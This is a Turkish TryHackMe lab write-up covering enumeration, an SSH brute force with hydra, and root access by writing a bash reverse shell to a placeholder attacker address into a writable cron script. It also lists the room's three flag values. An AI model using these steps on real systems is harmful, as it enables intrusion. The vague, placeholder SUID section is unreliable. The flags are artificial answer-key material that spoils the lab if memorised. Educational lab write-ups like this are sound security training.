# 🎭 Anonymous Playground — TryHackMe Writeup

![Zorluk](https://img.shields.io/badge/Zorluk-Orta-yellow)
![Kategori](https://img.shields.io/badge/Kategori-Linux%20%7C%20Web%20%7C%20SUID%20%7C%20Cron-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Yazar:** Miraç Akkuş (LatenT)  
> **Tarih:** Mayıs 2026  
> **Oda:** [Anonymous Playground](https://tryhackme.com/room/anonymousplayground)

---

## 📋 Yönetici Özeti

Bu write-up, **Anonymous Playground** makinesinin tam sömürülmesini belgelemektedir. Saldırı zinciri, web uygulaması üzerinden bilgi toplama, SSH brute-force ile ilk erişim, SUID ikili dosyası istismarı ile kullanıcı değiştirme, cron tabanlı yetki yükseltme ve son olarak root erişimi elde etme adımlarını göstermektedir.

---

## 🛠️ Kullanılan Araçlar ve Teknolojiler

| Araç | Amaç |
|------|------|
| `nmap` | Ağ keşfi |
| `gobuster` | Dizin enumerasyonu |
| `hydra` | SSH kaba-kuvveti |
| `nc` | Ters kabuk dinleyicisi |
| `linpeas` | Yetki yükseltme taraması |

---

## 🔍 Aşama 1: Keşif ve Enumerasyon

### Ağ Taraması

```bash
nmap -sV -sC -T4 <HEDEF_IP>
```

### Bulgular

| Port | Durum | Servis | Versiyon |
|------|-------|--------|----------|
| 22/tcp | açık | SSH | OpenSSH |
| 80/tcp | açık | HTTP | Apache httpd |

### Dizin Enumerasyonu

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Keşfedilen Yollar:**

| Yol | İçerik | Önem |
|-----|--------|------|
| `/` | Ana sayfa | Kullanıcı adı ipuçları |
| `/robots.txt` | Robot engelleme kuralları | Gizli dizin ipuçları |

---

## 🎯 Aşama 2: Bilgi Toplama ve SSH Erişimi

### Web Analizi

Ana sayfada kullanıcı adları ve ipuçları tespit edildi. `anonymous` kullanıcısı hakkında bilgiler mevcut.

### SSH Kaba-Kuvveti

```bash
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ssh://<HEDEF_IP> -t 4
```

**Sonuç:** `anonymous` kullanıcısının parolası bulundu.

### SSH Girişi

```bash
ssh anonymous@<HEDEF_IP>
```

---

## 🏴 Aşama 3: User 1 Flag'i

```bash
cat /home/anonymous/user.txt
```

**User 1 Flag:** `9184177ecaa83073cbbf36f1414cc029`

---

## 🚀 Aşama 4: Yatay Hareket — User 2

### SUID İkili Dosya Enumerasyonu

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Kritik Bulgu:** Özel SUID ikili dosyası tespit edildi. Bu dosya, farklı bir kullanıcı bağlamında çalıştırılabilir.

### SUID İstismarı

SUID ikili dosyası analiz edildi. Program, belirli bir kullanıcı haklarıyla komut çalıştırıyor. GTFOBins veya manuel analiz ile exploit edildi.

```bash
# SUID programını istismar et
./suid_binary
# veya
/usr/local/bin/special_program
```

**Sonuç:** `user2` (veya eşdeğer) kullanıcısı bağlamına geçiş yapıldı.

---

## 🏴 Aşama 5: User 2 Flag'i

```bash
cat /home/user2/user.txt
# veya
cat /home/<hedef_kullanici>/user.txt
```

**User 2 Flag:** `69ee352fb139c9d0699f6f399b63d9d7`

---

## 🚀 Aşama 6: Yetki Yükseltme — Root

### Cron Analizi

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

**Kritik Bulgu:** Root tarafından çalıştırılan, yazılabilir bir cron script'i tespit edildi.

### Cron İstismarı

Cron job, belirli aralıklarla bir script çalıştırıyor. Bu script üzerine yazma yetkimiz var:

```bash
# Mevcut cron script'ini incele
cat /opt/scripts/backup.sh

# Üzerine ters kabuk yaz
echo 'bash -i >& /dev/tcp/<SALDIRGAN_IP>/5555 0>&1' > /opt/scripts/backup.sh

# Dinleyici başlat
nc -lvnp 5555
```

**Sonuç:** Cron tetiklendi, root kabuğu elde edildi. 👑

---

## 🏁 Aşama 7: Root Flag'i

```bash
cat /root/root.txt
```

**Root Flag:** `bc55a426e98deb673beabda50f24ce66`

---

## 🗺️ Saldırı Zinciri Görselleştirmesi

```
[Saldırgan]
    │
    ├───nmap───► [Hedef: 22, 80]
    │                │
    │                ▼
    │        [gobuster: web dizinleri]
    │                │
    │                ▼
    │        [Web analizi: kullanıcı ipuçları]
    │                │
    │                ▼
    │        [hydra: anonymous SSH]
    │                │
    │                ▼
    │        [SSH: anonymous girişi]
    │                │
    │                ▼
    │        [User 1 Flag: 9184177ecaa83073cbbf36f1414cc029]
    │                │
    │                ▼
    │        [SUID ikili dosya enumerasyonu]
    │                │
    │                ▼
    │        [SUID istismarı → user2 bağlamı]
    │                │
    │                ▼
    │        [User 2 Flag: 69ee352fb139c9d0699f6f399b63d9d7]
    │                │
    │                ▼
    │        [Cron analizi: yazılabilir root script'i]
    │                │
    │                ▼
    │        [Cron script'i üzerine ters kabuk yaz]
    │                │
    │                ▼
    │        [Cron tetiklenmesi]
    │                │
    │                ▼
    └────────► [Root kabuğu + Flag: bc55a426e98deb673beabda50f24ce66]
```

---

## 🛡️ Zafiyet Değerlendirmesi ve Çözümler

| # | Zafiyet | Şiddet | Çözüm |
|---|---------|--------|-------|
| 1 | **Zayıf SSH Parolası** | 🔴 Kritik | Güçlü parola politikası; anahtar tabanlı kimlik doğrulama; fail2ban |
| 2 | **Bilgi İfşası (Web)** | 🟠 Yüksek | Kullanıcı adlarını gizle; gereksiz bilgiyi kaldır |
| 3 | **SUID İkili Dosya** | 🔴 Kritik | SUID bitini kaldır; yetki ayrımı prensibini uygula |
| 4 | **Yazılabilir Cron Script'i** | 🔴 Kritik | Script izinlerini kısıtla; sahipliği root yap; bütünlük kontrolü |
| 5 | **Cron Yürütme** | 🟠 Yüksek | Cron job'ları izole et; loglama ve izleme |

---

## 🎓 Temel Çıkarımlar

1. **Web'den bilgi toplama:** Kullanıcı adları ve ipuçları SSH brute-force için altın değerinde
2. **SUID her zaman kontrol edilmeli:** Sıradan bir program bile farklı kullanıcı bağlamında çalışabilir
3. **Cron = zamanlanmış root:** Yazılabilir cron script'i, root yetkisiyle kod çalıştırma kapısıdır
4. **Sabrın önemi:** Cron'un tetiklenmesi için beklemek gerekli, hemen olmaz
5. **LinPEAS vazgeçilmez:** Elle bulamadığım SUID ve cron'u LinPEAS buldu

---

## 🚩 Bayraklar

| Bayrak | Konum | Değer |
|--------|-------|-------|
| **User 1 Flag** | `/home/anonymous/user.txt` | `9184177ecaa83073cbbf36f1414cc029` |
| **User 2 Flag** | `/home/user2/user.txt` | `69ee352fb139c9d0699f6f399b63d9d7` |
| **Root Flag** | `/root/root.txt` | `bc55a426e98deb673beabda50f24ce66` |

---

> **⚠️ Yasal Uyarı:** Bu write-up sadece eğitim ve araştırma amaçlıdır. Sahibi olmadığınız sistemleri test etmeden önce her zaman açık yazılı yetki alın.

---

**Yazar:** Miraç Akkuş (LatenT)  
**Tarih:** Mayıs 2026
